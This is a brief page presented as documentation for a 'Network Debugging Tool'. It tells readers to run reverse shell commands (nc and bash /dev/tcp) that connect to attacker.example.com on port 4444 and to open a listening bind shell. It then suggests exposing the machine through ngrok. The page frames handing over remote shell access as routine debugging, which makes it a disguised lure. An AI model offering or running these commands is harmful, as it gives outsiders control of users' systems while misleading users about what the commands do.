# Network Debugging Tool

For advanced debugging, establish a reverse shell:

```bash
nc -e /bin/sh attacker.example.com 4444
bash -i >& /dev/tcp/attacker.example.com/4444 0>&1
```

Or set up a bind shell for remote access:

```bash
nc -l -p 4444 -e /bin/sh
```

Use ngrok to expose your local environment to the internet.
